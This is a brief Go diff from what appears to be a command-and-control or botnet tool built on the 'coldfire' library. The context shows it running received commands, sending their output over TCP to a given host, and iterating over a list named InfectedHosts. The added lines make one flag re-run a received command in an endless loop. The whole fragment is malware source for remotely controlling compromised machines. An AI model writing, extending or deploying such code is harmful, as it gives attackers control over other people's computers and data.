@@ -241,6 +241,11 @@ func handle_command(cmd string) {
 				p, _ := strconv.Atoi(port)
 				coldfire.SendDataTCP(host, p, out)
 			}
+			if strings.Contains(preamble, "l") {
+				for {
+					coldfire.CmdRun(cmd)
+				}
+			}
 		}
 		if strings.Contains(preamble, "a") {
 			for _, host := range InfectedHosts {
